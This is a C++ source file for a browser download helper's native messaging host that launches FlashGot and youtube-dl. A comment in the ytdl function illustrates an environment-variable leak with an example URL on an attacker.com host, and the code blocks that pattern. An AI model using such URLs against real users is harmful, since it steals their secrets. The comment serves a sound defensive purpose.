//TODO: make stdout binary in flashgot nativehost
//TODO: make flashgot nativehost message lenght logic like this one
//TODO: make sure everything is x86
//TODO: check licence of programs for redistribution
//TODO: vc++ 2015 is needed for yt-dlp(x86)
//TODO: change main to int _tmain(int argc, TCHAR *argv[]) in flashgot too

//policies
//nothing is allowed to consume an exception except for main()
//if a function wants to catch an exception it must rethrow it
//except for main functions of threads, they MUST consume their own exception
//all thread main function names should end with _th
//all thread main functions should have their whole body enclosed in a try-catch

#include "stdafx.h"
#include <iostream>
#include <string>
#include <fstream>
#include <fcntl.h>
#include <io.h>
#include <thread>
#include "DLGrab_Native_Host.h"
#include "utils.h"
#include "messaging.h"
#include "exceptions.h"
#include "defines.h"

using namespace std;
using namespace ggicci;


int wmain(int argc, WCHAR *argv[], WCHAR *envp[])
{
	//initializations
	try{
		plog::init(plog::debug, "log.txt", 1000*1000, 2);
		setupStdin();
		setupTmpDir();
	}
	catch(exception &e)
	{
		try{
			messaging::sendMessage(MSGTYP_ERR, e.what());
			PLOG_FATAL << e.what();
		}catch(...){}
		exit(EXIT_FAILURE);
	}
	//same just for unknown exceptions
	catch(...)
	{
		try{
			messaging::sendMessage(MSGTYP_ERR, "A fatal error has occurred");
			PLOG_FATAL << "A fatal error has occurred";
		}catch(...){}
		exit(EXIT_FAILURE);
	}

	PLOG_INFO << "starting native host";

	//the loop for sending/receiving messages
    while(true)
	{
		try
		{
			string raw_message = messaging::get_message();
			PLOG_INFO << "received message: " << raw_message;
			Json &msg = utils::parseJSON(raw_message);
			processMessage(msg);
		}
		catch(fatal_exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_FATAL << e.what();
			}catch(...){}
			//we exit after a fatal exception because otherwise the infinite loop will run rapidly
			exit(EXIT_FAILURE);
		}
		catch(exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_ERROR << e.what();
			}catch(...){}
		}
		//same just for unknown exceptions
		catch(...)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, "An unknown error has occurred");
				PLOG_ERROR << "An unknown error has occurred";
			}catch(...){}
		}

    }
}

//sets stdin to binary mode
void setupStdin()
{
	int res1 = _setmode( _fileno( stdin ), _O_BINARY );
	int res2 = _setmode( _fileno( stdout ), _O_BINARY );
	if( res1 == -1 || res2 == -1){
		throw fatal_exception("cannot set stdin mode to binary");
	}
}

//sets up our temp directory where we put files
string setupTmpDir()
{
	try
	{
		string DLGTempDir = utils::getDLGTempDir();
		utils::mkdir(DLGTempDir);
		return DLGTempDir;
	}
	catch(...)
	{
		throw fatal_exception("cannot setup temp directory");
	}
}

//using the reference of the Json object because pass by value caused exception because of copy constructor error
void processMessage(const Json &msg)
{
	try
	{
		string type = msg["type"].AsString();

		if(type == MSGTYP_GET_AVAIL_DMS)
		{
			handle_getavail(msg);
		}
		else if(type == MSGTYP_DOWNLOAD)
		{
			handle_download(msg);
		}
		else if(type == MSGTYP_YTDL_INFO)
		{
			handle_ytdlinfo(msg);
		}
		else if(type == MSGTYP_YTDL_VID)
		{
			handle_ytdlvid(msg);
		}
		else if(type == MSGTYP_YTDL_AUD)
		{
			handle_ytdlaud(msg);
		}
		else
		{
			messaging::sendMessage(MSGTYP_UNSUPP, "Unsupported message type");
		}
	}
	catch(dlg_exception &e)
	{
		throw e;
	}
	catch(exception &e)
	{
		string msg = "Error in processing message: ";
		msg.append(e.what());
		throw dlg_exception(msg.c_str());
	}
}

//handles "get_available_dms" request
void handle_getavail(const Json &msg)
{
	//TODO: output this directly from flashgot.exe
	vector<string> args;
	string fgOutput("");
	DWORD exitCode = utils::launchExe("flashgot.exe", args, &fgOutput);

	if( exitCode != 0 || fgOutput.length() == 0 )
	{
		throw dlg_exception("No output from FlashGot.exe");
	}

	PLOG_INFO << "fg output be: " << fgOutput;

	Json &dmsJSON = utils::parseJSON(fgOutput.c_str());
	Json res = Json::Parse("{}");
	res.AddProperty("type", Json("available_dms"));
	Json dms = Json::Parse("[]");
	for(int i=0; i<dmsJSON.Size(); i++)
	{
		if(dmsJSON[i]["available"].AsBool())
		{
			string name = dmsJSON[i]["name"].AsString();
			dms.Push(Json(name));
		}
	}
	res.AddProperty("availableDMs", dms);
	messaging::sendMessage(res);
}

//TODO: make FlashGot directly accept the JSON as job file instead of this 
//handles "download" request
void handle_download(const Json &msg)
{
	const Json &job = msg["job"];
	const Json &downloadsInfo = job["downloadsInfo"];
	string dmName = job["dmName"].AsString();
	string header("");
	//length;dmName;0;;
	string msgstr = msg.ToString();
	string jobstr = job.ToString();
	string infostr = downloadsInfo.ToString();
	header.append(std::to_string(downloadsInfo.Size()));
	header.append(";");
	header.append(dmName);
	header.append(";0;;");

	string jobText = header;
	jobText.append("\n");
	jobText.append(job["referer"].AsString());
	jobText.append("\n");

	for(int i=0; i<downloadsInfo.Size(); i++)
	{
		jobText.append(downloadsInfo[i]["url"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["desc"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["cookies"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["postData"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["filename"].AsString());
		jobText.append("\n");
		jobText.append(downloadsInfo[i]["extension"].AsString());
		jobText.append("\n");
	}

	jobText.append(job["originPageReferer"].AsString());
	jobText.append("\n");
	jobText.append(job["originPageCookies"].AsString());
	jobText.append("\n");
	jobText.append("\n");
	jobText.append("\n");
	jobText.append(job["useragent"].AsString());
	jobText.append("\n");

	flashGot(jobText);
}

void handle_ytdlinfo(const Json &msg)
{
	string pageUrl = msg["page_url"].AsString();
	string manifestUrl = msg["manifest_url"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_info_th, pageUrl, manifestUrl, dlHash);
	th1.detach();
}

void handle_ytdlvid(const Json &msg)
{
	string url = msg["url"].AsString();
	string name = msg["name"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_video_th, url, name, dlHash);
	th1.detach();
}

void handle_ytdlaud(const Json &msg)
{
	string url = msg["url"].AsString();
	string name = msg["name"].AsString();
	string dlHash = msg["dlHash"].AsString();
	std::thread th1(ytdl_audio_th, url, name, dlHash);
	th1.detach();
}

//launches FlashGot to perform a download with a DM
void flashGot(const string &jobText)
{
	try
	{
		string jobFileName = utils::getNewTempFileName();
		std::ofstream jobFile(jobFileName);
		jobFile << jobText;
		jobFile.close();

		vector<string> args;
		args.push_back(jobFileName);
		utils::launchExe("FlashGot.exe", args);
	}
	catch(exception &e)
	{
		string msg = "Error in FlashGot execution: ";
		msg.append(e.what());
		throw dlg_exception(msg.c_str());
	}
}

void ytdl_info_th(const string &pageurl, const string &manifestUrl, const string &dlHash)
{
	try
	{
		vector<string> args;
		args.push_back("-j");
		string ytdlOutput = ytdl(pageurl, args);

		Json info;
		bool isFromManifest = false;

		try
		{
			info = utils::parseJSON(ytdlOutput.c_str());
		}
		catch(...)
		{
			//YTDL output not JSON
			//Happens when YTDL outputs an error
			//Let's try with the manifest itself
			ytdlOutput = ytdl(manifestUrl, args);
			try
			{
				info = utils::parseJSON(ytdlOutput.c_str());
				isFromManifest = true;
			}
			catch(...)
			{
				//Must be some shit if even this one fails
				info = Json(ytdlOutput);
			}
		}

		Json msg = Json::Parse("{}");
		msg.AddProperty("type", Json(MSGTYP_YTDL_INFO));
		msg.AddProperty("dlHash", Json(dlHash));
		msg.AddProperty("info", info);
		if(isFromManifest){
			msg.AddProperty("is_from_manifest", Json(isFromManifest));
		}
		messaging::sendMessage(msg);
	}
	catch(...){} 	//ain't nothing we can do if we're here
}

void ytdl_video_th(const string &url, const string &name, const string &dlHash)
{
	try
	{
		string safeName = utils::sanitizeFilename(name.c_str());
		string savePath = utils::saveDialog(safeName);

		//if it's canceled do nothing
		if(savePath.length() == 0)
		{
			return;
		}

		savePath.append(".%(ext)s");

		vector<string> args;
		args.push_back("--newline");
		args.push_back("--output");
		args.push_back(savePath);

		string output = ytdl(url, args, onProgress);
		string type = (output.length() > 0) ? MSGTYP_YTDL_COMP : MSGTYP_YTDL_FAIL;

		Json msg = Json::Parse("{}");
		msg.AddProperty("dlHash", Json(dlHash));
		msg.AddProperty("type", Json(type));
		messaging::sendMessage(msg);
	}
	catch(exception &e)
	{
		string msg = "Error downloading video: ";
		msg.append(e.what());
		messaging::sendMessage(MSGTYP_ERR, msg);
	}
	catch(...){} 	//ain't nothing we can do if we're here
}

void ytdl_audio_th(const string &url, const string &name, const string &dlHash)
{
	try
	{
		//TODO
	}
	catch(exception &e)
	{
		string msg = "Error downloading audio: ";
		msg.append(e.what());
		messaging::sendMessage(MSGTYP_ERR, msg);
	}
	catch(...){} 	//ain't nothing we can do if we're here
}

string ytdl(const string &url, vector<string> args, void (*onOutput)(const string &output))
{
	try
	{
		//ok so the issue is an attacker could make the user request a malicious URL and steal environment variables from them
		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
		//and send it to the attacker
		//not really a huge deal because nobody should put secrets in environment variables anyway and also
		//we are url-encoding our URLs so it would be difficult to come up with a URL that would leak an actual env. var
		//but not impossible
		//this could also happen by accident leading to undefined behavior
		//so we search the URL and if we find any env. variables in it we just reject it
		if(utils::strHasEnvars(url))
		{
			throw dlg_exception("This URL is not supported");
		}

		args.push_back(url);
		string output("");
		DWORD exitCode = utils::launchExe("ytdl.exe", args, &output, onOutput);

		//if our output is empty our callers know something went wrong
		if(exitCode != 0)
		{
			output = "";
		}

		return output;
	}
	catch(exception &e)
	{
		string msg = "Error in YoutubeDL execution: ";
		msg.append(e.what());
		throw dlg_exception(msg.c_str());
	}
}

void onProgress(const string &output)
{
	//output is like \r[download]   2.3% of 1.33MiB at 108.51KiB/s ETA 00:12
	//get last line of output, cause output can be multiple lines
	vector<string> lines = utils::strSplit(output, '\n');
	vector<string> parts = utils::strSplit(lines.back(), ' ');
	if(parts.size()>0 && output.find('%')!=string::npos)
	{
		messaging::sendMessageLimit(MSGTYP_YTDLPROG, parts[1], 1);
	}
}